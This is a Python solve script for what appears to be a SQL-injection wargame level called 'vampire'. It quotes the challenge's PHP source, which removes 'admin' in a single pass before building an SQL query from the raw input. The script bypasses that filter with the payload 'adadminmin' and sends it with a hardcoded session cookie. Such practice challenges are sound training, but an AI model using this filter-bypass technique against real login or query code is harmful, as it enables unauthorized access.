import requests

"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  $_GET[id] = strtolower($_GET[id]);
  $_GET[id] = str_replace("admin","",$_GET[id]); 
  $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("vampire"); 
  highlight_file(__FILE__); 
?>
"""
url = "https://los.eagle-jump.org/vampire_0538b0259b6680c1ca4631a388177ed4.php"
payload = {"id":"adadminmin"}
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,params=payload,cookies=cookie)
print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")